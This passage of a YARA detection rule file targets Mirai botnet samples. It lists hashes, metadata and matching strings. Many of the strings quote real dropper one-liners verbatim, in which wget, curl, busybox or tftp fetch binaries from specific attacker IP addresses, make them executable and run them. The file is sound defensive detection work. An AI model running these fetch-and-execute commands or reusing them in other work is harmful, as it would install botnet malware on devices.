      $s3 = "[%s():%d] target %d.%d.%d.%d/%d" fullword ascii /* score: '21.00'*/
      $s4 = "[%s():%d] Payload could not be decoded! Cancelling attack." fullword ascii /* score: '19.00'*/
      $s5 = "[%s():%d] Connection failed!" fullword ascii /* score: '19.00'*/
      $s6 = "[%s():%d] Connection error: %s" fullword ascii /* score: '19.00'*/
      $s7 = "[%s():%d] Killing processes holding port %d" fullword ascii /* score: '18.00'*/
      $s8 = "[%s():%d] Process kill request accepted, killing our own malware." fullword ascii /* score: '18.00'*/
      $s9 = "[%s():%d] Failed to match a command with the ID %d!" fullword ascii /* score: '18.00'*/
      $s10 = "[%s():%d] Connection timeout" fullword ascii /* score: '16.00'*/
      $s11 = "[%s():%d] Connection established, waiting for key handover!" fullword ascii /* score: '16.00'*/
      $s12 = "[%s():%d] Connection could not be established" fullword ascii /* score: '16.00'*/
      $s13 = "[%s():%d] [SOCKET] [FD%d] Connection established" fullword ascii /* score: '16.00'*/
      $s14 = "[%s():%d] Key decryption failed" fullword ascii /* score: '15.00'*/
      $s15 = "[%s():%d] Error receiving buffer from HTTP GET request" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Mirai_signature__43c1d22a {
   meta:
      description = "_subset_batch - file Mirai(signature)_43c1d22a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "43c1d22a7cd3fc7cf0b038cc743f439d525bcd62c660ccad0042942ab6f0aeaa"
   strings:
      $s1 = "Killed process: " fullword ascii /* score: '15.00'*/
      $s2 = "/home/process/" fullword ascii /* score: '15.00'*/
      $s3 = "/usr/libexec/" fullword ascii /* score: '12.00'*/
      $s4 = "/system/system/bin/" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__6c5b7e60 {
   meta:
      description = "_subset_batch - file Mirai(signature)_6c5b7e60.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6c5b7e60188ac8cb086eb3a315efaf6dd19e1df8fddf256632907b9e721dba8c"
   strings:
      $s1 = "Killed process: " fullword ascii /* score: '15.00'*/
      $s2 = "/home/process/" fullword ascii /* score: '15.00'*/
      $s3 = "/usr/libexec/" fullword ascii /* score: '12.00'*/
      $s4 = "/system/system/bin/" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__374309fd {
   meta:
      description = "_subset_batch - file Mirai(signature)_374309fd.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "374309fde2f1d07ff68ce63abf18de587cf4084f3e731b66c417a16b605cddae"
   strings:
      $s1 = "wget http://109.205.213.5/kvariant.arm; chmod 777 kvariant.arm; ./kvariant.arm lilin.exploit;" fullword ascii /* score: '27.00'*/
      $s2 = "wget http://109.205.213.5/kvariant.arm6; chmod 777 kvariant.arm6; ./kvariant.arm6 lilin.exploit;" fullword ascii /* score: '24.00'*/
      $s3 = "wget http://109.205.213.5/kvariant.arm5; chmod 777 kvariant.arm5; ./kvariant.arm5 lilin.exploit;" fullword ascii /* score: '24.00'*/
      $s4 = "wget http://109.205.213.5/kvariant.arm7; chmod 777 kvariant.arm7; ./kvariant.arm7 lilin.exploit;" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      all of them
}

rule Mirai_signature__4231a7b1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_4231a7b1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4231a7b105ccace895a2b61aa04f93f73e785541ef2d4cf212a9e2172ae96900"
   strings:
      $s1 = " 6!: <='<#}7*=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'g' */
      $s2 = " 6!: 1<'}4668" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aFh' */
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__4bc43dd7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_4bc43dd7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4bc43dd7a37d63a228cbe40993803f1412bfbccfef157c28d418eeaa7e50df7c"
   strings:
      $s1 = " 6!: <='<#}7*=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'g' */
      $s2 = " 6!: 1<'}4668" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aFh' */
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__48f9b8b5 {
   meta:
      description = "_subset_batch - file Mirai(signature)_48f9b8b5.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "48f9b8b59cffa95f8259c000be87b70afe66ab4f116d04c5ca247d0edcdf2dbe"
   strings:
      $s1 = "cd /tmp; rm -rf mips; wget http://178.16.54.178/mips; chmod +x mips; ./mips c.mips" fullword ascii /* score: '27.00'*/
      $s2 = "cd /tmp; rm -rf arm5; wget http://178.16.54.178/arm5; chmod +x arm5; ./arm5 c.arm5" fullword ascii /* score: '27.00'*/
      $s3 = "cd /tmp; rm -rf mpsl; wget http://178.16.54.178/mpsl; chmod +x mpsl; ./mpsl c.mpsl" fullword ascii /* score: '27.00'*/
      $s4 = "cd /tmp; rm -rf arm7; wget http://178.16.54.178/arm7; chmod +x arm7; ./arm7 c.arm7" fullword ascii /* score: '27.00'*/
      $s5 = "cd /tmp; rm -rf arm6; wget http://178.16.54.178/arm6; chmod +x arm6; ./arm6 c.arm6" fullword ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule Mirai_signature__4bab88d9 {
   meta:
      description = "_subset_batch - file Mirai(signature)_4bab88d9.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4bab88d9a4478eba6bf849f1a4b0a1e54c96e18eee677502c2d5642028f63f2e"
   strings:
      $s1 = "busybox wget http://109.205.213.5/kvariant.arm; chmod 777 kvariant.arm; ./kvariant.arm LG.telecom;" fullword ascii /* score: '26.00'*/
      $s2 = "busybox wget http://109.205.213.5/kvariant.arm6; chmod 777 kvariant.arm6; ./kvariant.arm6 LG.telecom;" fullword ascii /* score: '23.00'*/
      $s3 = "busybox wget http://109.205.213.5/kvariant.arm7; chmod 777 kvariant.arm7; ./kvariant.arm7 LG.telecom;" fullword ascii /* score: '23.00'*/
      $s4 = "busybox wget http://109.205.213.5/kvariant.arm5; chmod 777 kvariant.arm5; ./kvariant.arm5 LG.telecom;" fullword ascii /* score: '23.00'*/
      $s5 = "busybox wget http://109.205.213.5/kvariant.mpsl; chmod 777 kvariant.mpsl; ./kvariant.mpsl twix.LG;" fullword ascii /* score: '20.00'*/
      $s6 = "busybox wget http://109.205.213.5/kvariant.mips: chmod 777 kvariant.mips; ./kvariant.mips twix.LG;" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x7562 and filesize < 1KB and
      all of them
}

rule Mirai_signature__4d60066a {
   meta:
      description = "_subset_batch - file Mirai(signature)_4d60066a.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4d60066a9668633e2282b5ec5a8488e3bace69a804c54008f40aea93ed0e6d91"
   strings:
      $x1 = "(busybox wget http://160.250.134.51/lol.arc -O- || wget http://160.250.134.51/lol.arc -O-) > .f; chmod 777 .f; ./.f lilin.0day; " ascii /* score: '31.00'*/
      $x2 = "(busybox wget http://160.250.134.51/lol.arm -O- || wget http://160.250.134.51/lol.arm -O-) > .f; chmod 777 .f; ./.f lilin.0day; " ascii /* score: '31.00'*/
      $x3 = "(busybox wget http://160.250.134.51/lol.arc -O- || wget http://160.250.134.51/lol.arc -O-) > .f; chmod 777 .f; ./.f lilin.0day; " ascii /* score: '31.00'*/
      $x4 = "(busybox wget http://160.250.134.51/lol.arm -O- || wget http://160.250.134.51/lol.arm -O-) > .f; chmod 777 .f; ./.f lilin.0day; " ascii /* score: '31.00'*/
      $s5 = "(busybox wget http://160.250.134.51/lol.arm5 -O- || wget http://160.250.134.51/lol.arm5 -O-) > .f; chmod 777 .f; ./.f lilin.0day" ascii /* score: '28.00'*/
      $s6 = "(busybox wget http://160.250.134.51/lol.aarch64 -O- || wget http://160.250.134.51/lol.aarch64 -O-) > .f; chmod 777 .f; ./.f lili" ascii /* score: '28.00'*/
      $s7 = "(busybox wget http://160.250.134.51/lol.aarch64 -O- || wget http://160.250.134.51/lol.aarch64 -O-) > .f; chmod 777 .f; ./.f lili" ascii /* score: '28.00'*/
      $s8 = "(busybox wget http://160.250.134.51/lol.mips -O- || wget http://160.250.134.51/lol.mips -O-) > .f; chmod 777 .f; ./.f lilin.0day" ascii /* score: '28.00'*/
      $s9 = "(busybox wget http://160.250.134.51/lol.mips -O- || wget http://160.250.134.51/lol.mips -O-) > .f; chmod 777 .f; ./.f lilin.0day" ascii /* score: '28.00'*/
      $s10 = "(busybox wget http://160.250.134.51/lol.mpsl -O- || wget http://160.250.134.51/lol.mpsl -O-) > .f; chmod 777 .f; ./.f lilin.0day" ascii /* score: '28.00'*/
      $s11 = "(busybox wget http://160.250.134.51/lol.arm7 -O- || wget http://160.250.134.51/lol.arm7 -O-) > .f; chmod 777 .f; ./.f lilin.0day" ascii /* score: '28.00'*/
      $s12 = "(busybox wget http://160.250.134.51/lol.mpsl -O- || wget http://160.250.134.51/lol.mpsl -O-) > .f; chmod 777 .f; ./.f lilin.0day" ascii /* score: '28.00'*/
      $s13 = "(busybox wget http://160.250.134.51/lol.arm7 -O- || wget http://160.250.134.51/lol.arm7 -O-) > .f; chmod 777 .f; ./.f lilin.0day" ascii /* score: '28.00'*/
      $s14 = "(busybox wget http://160.250.134.51/lol.arm5 -O- || wget http://160.250.134.51/lol.arm5 -O-) > .f; chmod 777 .f; ./.f lilin.0day" ascii /* score: '28.00'*/
      $s15 = "rm /tmp/busybox;" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 2KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__52c94e3c {
   meta:
      description = "_subset_batch - file Mirai(signature)_52c94e3c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "52c94e3c75efa93f2d32a2ed2ab1c45da74b5ce058701aa98a60a56556529b20"
   strings:
      $s1 = "(busybox wget http://160.250.134.51/mpsl -O- || wget http://160.250.134.51/mpsl -O-) > .iliketomovemoveit; chmod 777 .iliketomov" ascii /* score: '28.00'*/
      $s2 = "(busybox wget http://160.250.134.51/arc -O- || wget http://160.250.134.51/arc -O-) > .iliketomovemoveit; chmod 777 .iliketomovem" ascii /* score: '28.00'*/
      $s3 = "(busybox wget http://160.250.134.51/arm -O- || wget http://160.250.134.51/arm -O-) > .iliketomovemoveit; chmod 777 .iliketomovem" ascii /* score: '28.00'*/
      $s4 = "(busybox wget http://160.250.134.51/aarch64 -O- || wget http://160.250.134.51/aarch64 -O-) > .iliketomovemoveit; chmod 777 .ilik" ascii /* score: '28.00'*/
      $s5 = "(busybox wget http://160.250.134.51/arm5 -O- || wget http://160.250.134.51/arm5 -O-) > .iliketomovemoveit; chmod 777 .iliketomov" ascii /* score: '28.00'*/
      $s6 = "(busybox wget http://160.250.134.51/mips -O- || wget http://160.250.134.51/mips -O-) > .iliketomovemoveit; chmod 777 .iliketomov" ascii /* score: '28.00'*/
      $s7 = "(busybox wget http://160.250.134.51/arm7 -O- || wget http://160.250.134.51/arm7 -O-) > .iliketomovemoveit; chmod 777 .iliketomov" ascii /* score: '28.00'*/
      $s8 = "(busybox wget http://160.250.134.51/mips -O- || wget http://160.250.134.51/mips -O-) > .iliketomovemoveit; chmod 777 .iliketomov" ascii /* score: '28.00'*/
      $s9 = "(busybox wget http://160.250.134.51/arc -O- || wget http://160.250.134.51/arc -O-) > .iliketomovemoveit; chmod 777 .iliketomovem" ascii /* score: '28.00'*/
      $s10 = "(busybox wget http://160.250.134.51/arm -O- || wget http://160.250.134.51/arm -O-) > .iliketomovemoveit; chmod 777 .iliketomovem" ascii /* score: '28.00'*/
      $s11 = "(busybox wget http://160.250.134.51/aarch64 -O- || wget http://160.250.134.51/aarch64 -O-) > .iliketomovemoveit; chmod 777 .ilik" ascii /* score: '28.00'*/
      $s12 = "(busybox wget http://160.250.134.51/arm5 -O- || wget http://160.250.134.51/arm5 -O-) > .iliketomovemoveit; chmod 777 .iliketomov" ascii /* score: '28.00'*/
      $s13 = "(busybox wget http://160.250.134.51/arm7 -O- || wget http://160.250.134.51/arm7 -O-) > .iliketomovemoveit; chmod 777 .iliketomov" ascii /* score: '28.00'*/
      $s14 = "(busybox wget http://160.250.134.51/mpsl -O- || wget http://160.250.134.51/mpsl -O-) > .iliketomovemoveit; chmod 777 .iliketomov" ascii /* score: '28.00'*/
      $s15 = "busybox tftp -g -r arm7 160.250.134.51; tftp -g -r arm7 160.250.134.51; chmod 777 arm7; ./arm7 mass.lilin; rm arm7;" fullword ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__512465c3 {
   meta:
      description = "_subset_batch - file Mirai(signature)_512465c3.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "512465c3151503487797d05fba8d2f177b779ebcfea89f1be04adda843d45617"
   strings:
      $s1 = "wget http://193.17.183.25/arm6; chmod 777 arm6; ./arm6 arm6" fullword ascii /* score: '20.00'*/
      $s2 = "wget http://193.17.183.25/arm5; chmod 777 arm5; ./arm5 arm5" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://193.17.183.25/mips; chmod 777 mips; ./mips mips" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://193.17.183.25/x86; chmod 777 x86; ./x86" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://193.17.183.25/mpsl; chmod 777 mpsl; ./mpsl mpsl" fullword ascii /* score: '20.00'*/
      $s6 = "wget http://193.17.183.25/arm4; chmod 777 arm4; ./arm4 arm4" fullword ascii /* score: '20.00'*/
      $s7 = "wget http://193.17.183.25/arm7; chmod 777 arm7; ./arm7 arm7" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      all of them
}

rule Mirai_signature__641850e1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_641850e1.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "641850e1dc2ba8af693deb056cabc0cc0194306ef5cfad0ded88309ded2a9b06"
   strings:
      $s1 = "wget http://193.17.183.25/arm6; chmod 777 arm6; ./arm6 arm6" fullword ascii /* score: '20.00'*/
      $s2 = "wget http://193.17.183.25/arm5; chmod 777 arm5; ./arm5 arm5" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://193.17.183.25/mips; chmod 777 mips; ./mips mips" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://193.17.183.25/mpsl; chmod 777 mpsl; ./mpsl mpsl" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://193.17.183.25/arm4; chmod 777 arm4; ./arm4 arm4" fullword ascii /* score: '20.00'*/
      $s6 = "wget http://193.17.183.25/arm7; chmod 777 arm7; ./arm7 arm7" fullword ascii /* score: '20.00'*/
      $s7 = "wget http://193.17.183.25/x86; chmod 777 x86; ./x86 x86_64" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      all of them
}

rule Mirai_signature__5316df86 {
   meta:
      description = "_subset_batch - file Mirai(signature)_5316df86.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5316df86854e8f99b024a8039843b12275fc3a10c8680d3393e699d735bb4bef"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/arm; curl -O http://64.188.8.180/system" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/mpsl; curl -O http://64.188.8.180/syste" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/arm7; curl -O http://64.188.8.180/syste" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/mips; curl -O http://64.188.8.180/syste" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/spc; curl -O http://64.188.8.180/system" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/arm6; curl -O http://64.188.8.180/syste" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/x86; curl -O http://64.188.8.180/system" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/arm5; curl -O http://64.188.8.180/syste" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/x86_64; curl -O http://64.188.8.180/sys" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/m68k; curl -O http://64.188.8.180/syste" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/arc; curl -O http://64.188.8.180/system" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/sh4; curl -O http://64.188.8.180/system" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/ppc; curl -O http://64.188.8.180/system" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/mips; curl -O http://64.188.8.180/syste" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.188.8.180/systemcl/arm6; curl -O http://64.188.8.180/syste" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 7KB and
      8 of them
}

rule Mirai_signature__55f3c135 {
   meta:
      description = "_subset_batch - file Mirai(signature)_55f3c135.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "55f3c135a5e84c4e6bc718fc4ddbb1e9098d6cae7aaac9ea5f6444883c9fad77"
   strings:
      $s1 = "wget http://109.205.213.5/kvariant.arc; chmod 777 kvariant.arc; ./kvariant.arc dlink.exploit;" fullword ascii /* score: '27.00'*/
      $s2 = "wget http://109.205.213.5/kvariant.spc; chmod 777 kvariant.spc; ./kvariant.spc dlink.exploit;" fullword ascii /* score: '27.00'*/
      $s3 = "wget http://109.205.213.5/kvariant.arm; chmod 777 kvariant.arm; ./kvariant.arm dlink.exploit;" fullword ascii /* score: '27.00'*/
      $s4 = "wget http://109.205.213.5/kvariant.ppc; chmod 777 kvariant.ppc; ./kvariant.ppc dlink.exploit;" fullword ascii /* score: '27.00'*/
      $s5 = "wget http://109.205.213.5/kvariant.x86; chmod 777 kvariant.x86; ./kvariant.x86 dlink.exploit;" fullword ascii /* score: '24.00'*/
      $s6 = "wget http://109.205.213.5/kvariant.arm6; chmod 777 kvariant.arm6; ./kvariant.arm6 dlink.exploit;" fullword ascii /* score: '24.00'*/
      $s7 = "wget http://109.205.213.5/kvariant.arm5; chmod 777 kvariant.arm5; ./kvariant.arm5 dlink.exploit;" fullword ascii /* score: '24.00'*/
      $s8 = "wget http://109.205.213.5/kvariant.mips; chmod 777 kvariant.mips; ./kvariant.mips dlink.exploit;" fullword ascii /* score: '24.00'*/
      $s9 = "wget http://109.205.213.5/kvariant.mpsl; chmod 777 kvariant.mpsl; ./kvariant.mpsl dlink.exploit;" fullword ascii /* score: '24.00'*/
      $s10 = "wget http://109.205.213.5/kvariant.sh4; chmod 777 kvariant.sh4; ./kvariant.sh4 dlink.exploit;" fullword ascii /* score: '24.00'*/
      $s11 = "wget http://109.205.213.5/kvariant.arm7; chmod 777 kvariant.arm7; ./kvariant.arm7 dlink.exploit;" fullword ascii /* score: '24.00'*/
      $s12 = "wget http://109.205.213.5/kvariant.m68k; chmod 777 kvariant.m68k; ./kvariant.m68k dlink.exploit;" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__606fd541 {
   meta:
      description = "_subset_batch - file Mirai(signature)_606fd541.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "606fd541d4d782d04ee1b38bc142854eb5930ba5588a507592f18795f0beed61"
   strings:
      $s1 = "wget http://109.205.213.5/kvariant.arc; chmod 777 kvariant.arc; ./kvariant.arc ssh.wget;" fullword ascii /* score: '23.00'*/
      $s2 = "wget http://109.205.213.5/kvariant.spc; chmod 777 kvariant.spc; ./kvariant.spc ssh.wget;" fullword ascii /* score: '23.00'*/
      $s3 = "wget http://109.205.213.5/kvariant.arm; chmod 777 kvariant.arm; ./kvariant.arm ssh.wget;" fullword ascii /* score: '23.00'*/
      $s4 = "wget http://109.205.213.5/kvariant.ppc; chmod 777 kvariant.ppc; ./kvariant.ppc ssh.wget;" fullword ascii /* score: '23.00'*/
      $s5 = "curl -O http://46.23.109.47/kvariant.ppc; chmod 777 kvariant.ppc; ./kvariant.ppc ssh.curl;" fullword ascii /* score: '22.00'*/
      $s6 = "curl -O http://46.23.109.47/kvariant.spc; chmod 777 kvariant.spc; ./kvariant.spc ssh.curl;" fullword ascii /* score: '22.00'*/
      $s7 = "curl -O http://46.23.109.47/kvariant.arc; chmod 777 kvariant.arc; ./kvariant.arc ssh.curl;" fullword ascii /* score: '22.00'*/
      $s8 = "curl -O http://46.23.109.47/kvariant.arm; chmod 777 kvariant.arm; ./kvariant.arm ssh.curl;" fullword ascii /* score: '22.00'*/
      $s9 = "wget http://109.205.213.5/kvariant.mpsl; chmod 777 kvariant.mpsl; ./kvariant.mpsl ssh.wget;" fullword ascii /* score: '20.00'*/
      $s10 = "wget http://109.205.213.5/kvariant.m68k; chmod 777 kvariant.m68k; ./kvariant.m68k ssh.wget;" fullword ascii /* score: '20.00'*/
      $s11 = "wget http://109.205.213.5/kvariant.x86; chmod 777 kvariant.x86; ./kvariant.x86 ssh.wget;" fullword ascii /* score: '20.00'*/
      $s12 = "wget http://109.205.213.5/kvariant.arm6; chmod 777 kvariant.arm6; ./kvariant.arm6 ssh.wget;" fullword ascii /* score: '20.00'*/
      $s13 = "wget http://109.205.213.5/kvariant.arm5; chmod 777 kvariant.arm5; ./kvariant.arm5 ssh.wget;" fullword ascii /* score: '20.00'*/
      $s14 = "wget http://109.205.213.5/kvariant.mips; chmod 777 kvariant.mips; ./kvariant.mips ssh.wget;" fullword ascii /* score: '20.00'*/
      $s15 = "wget http://109.205.213.5/kvariant.arm7; chmod 777 kvariant.arm7; ./kvariant.arm7 ssh.wget;" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 6KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _Mirai_signature__33334d1b_Mirai_signature__3a44b78f_Mirai_signature__6174da43_0 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_33334d1b.elf, Mirai(signature)_3a44b78f.elf, Mirai(signature)_6174da43.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "33334d1bf4a80c1e151b8d550b730c2da797cd67b039d756065108a2638ef63b"
      hash2 = "3a44b78f278da898c81bd1c7c5f894e6abebecb2a00fd99895c0da898ad075e3"
      hash3 = "6174da43dd0e045dcd0a55746bf4229b564a8fead60329fb93e754693d60a3f1"
   strings:
      $s1 = "e != EDEADLK || (kind != PTHREAD_MUTEX_ERRORCHECK_NP && kind != PTHREAD_MUTEX_RECURSIVE_NP)" fullword ascii /* score: '24.00'*/
      $s2 = "glibc.pthread.mutex_spin_count" fullword ascii /* score: '21.00'*/
      $s3 = "type == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii /* score: '21.00'*/
      $s4 = "PTHREAD_MUTEX_TYPE (mutex) == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii /* score: '21.00'*/
      $s5 = "pthread_mutex_unlock.o" fullword ascii /* score: '18.00'*/
      $s6 = "pthread_mutex_lock.o" fullword ascii /* score: '18.00'*/
      $s7 = "___pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s8 = "___pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s9 = "relocation processing: %s%s" fullword ascii /* score: '18.00'*/
      $s10 = "pthread_mutex_conf.o" fullword ascii /* score: '18.00'*/
      $s11 = "EHWPOISON" fullword ascii /* score: '16.50'*/
      $s12 = "%s%s%s:%u: %s%sAssertion `%s' failed." fullword ascii /* score: '16.50'*/
      $s13 = "failed to allocate memory to process tunables" fullword ascii /* score: '16.00'*/
      $s14 = "_dlfo_process_initial" fullword ascii /* score: '15.00'*/
      $s15 = "ELF load command address/offset not page-aligned" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__420c7996_Mirai_signature__44381eff_Mirai_signature__4e872d3b_Mirai_signature__4f248a58_1 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_420c7996.elf, Mirai(signature)_44381eff.elf, Mirai(signature)_4e872d3b.elf, Mirai(signature)_4f248a58.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "420c79968123a4bb09e9ff5640ab32da1eb0677ea1a9516f70f40a9dfbefa46c"
      hash2 = "44381effdd350359a39db85ada72c070037c844ee032efd1b50cfa99e28f3325"
      hash3 = "4e872d3be5179467ff6f82e474edb840fbb2a20823e6d06cfee931efcc127495"
      hash4 = "4f248a582a083d8d67d18ae8c2acaa4cfc88b00d882c4f6ba256148b5db96b73"
   strings:
      $s1 = "__pthread_mutexattr_getpshared" fullword ascii /* score: '23.00'*/
      $s2 = "__pthread_mutexattr_gettype" fullword ascii /* score: '23.00'*/
      $s3 = "__pthread_mutexattr_getkind_np" fullword ascii /* score: '23.00'*/
      $s4 = "__pthread_mutexattr_init" fullword ascii /* score: '18.00'*/
      $s5 = "__pthread_mutexattr_setkind_np" fullword ascii /* score: '18.00'*/
      $s6 = "__pthread_mutexattr_destroy" fullword ascii /* score: '18.00'*/
      $s7 = "__pthread_mutex_destroy" fullword ascii /* score: '18.00'*/
      $s8 = "pthread_keys_mutex" fullword ascii /* score: '18.00'*/
      $s9 = "__pthread_mutexattr_settype" fullword ascii /* score: '18.00'*/
      $s10 = "__pthread_mutexattr_setpshared" fullword ascii /* score: '18.00'*/
      $s11 = "mutex.c" fullword ascii /* score: '15.00'*/
      $s12 = "pthread_onexit_process" fullword ascii /* score: '15.00'*/
      $s13 = "__GI_pthread_attr_getinheritsched" fullword ascii /* score: '12.00'*/
      $s14 = "__pthread_getconcurrency" fullword ascii /* score: '12.00'*/
      $s15 = "__GI_pthread_attr_getschedpolicy" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__1d600e2d_Mirai_signature__1ebc071c_Mirai_signature__1fd07b9a_Mirai_signature__251e7e86_Mirai_signature__25_2 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_1d600e2d.elf, Mirai(signature)_1ebc071c.elf, Mirai(signature)_1fd07b9a.elf, Mirai(signature)_251e7e86.elf, Mirai(signature)_25d4d387.elf, Mirai(signature)_264370b8.elf, Mirai(signature)_26f251ca.elf, Mirai(signature)_28711053.elf, Mirai(signature)_2be9ccee.elf, Mirai(signature)_2ee9a42c.elf, Mirai(signature)_2f52dc2e.elf, Mirai(signature)_3022317d.elf, Mirai(signature)_355ff5d3.elf, Mirai(signature)_36db9aab.elf, Mirai(signature)_36dd257b.elf, Mirai(signature)_37e39ec8.elf, Mirai(signature)_3faf4357.elf, Mirai(signature)_3fb73ed9.elf, Mirai(signature)_4257f099.elf, Mirai(signature)_42f0f7da.elf, Mirai(signature)_435e67c0.elf, Mirai(signature)_45c211c1.elf, Mirai(signature)_488a3964.elf, Mirai(signature)_4a117998.elf, Mirai(signature)_4ccabe30.elf, Mirai(signature)_4d8d5b8a.elf, Mirai(signature)_4dcdbd21.elf, Mirai(signature)_51e85925.elf, Mirai(signature)_5245c572.elf, Mirai(signature)_551cbc16.elf, Mirai(signature)_56ca29b1.elf, Mirai(signature)_572b6ab3.elf, Mirai(signature)_5943207f.elf, Mirai(signature)_5b18c9cb.elf, Mirai(signature)_5c9d399b.elf, Mirai(signature)_5ebf996d.elf, Mirai(signature)_5f343a4b.elf, Mirai(signature)_61c23c33.elf, Mirai(signature)_6407da13.elf, Mirai(signature)_654d37fe.elf, Mirai(signature)_674e4453.elf, Mirai(signature)_68f89833.elf, Mirai(signature)_6b469574.elf, Mirai(signature)_6bf02c0a.elf, Mirai(signature)_6bfe1ef9.elf, Mirai(signature)_6c9a81f9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d600e2d91d8c36e90d1ed7361dad751ad8f5e859bce7302fc569c7559df0557"
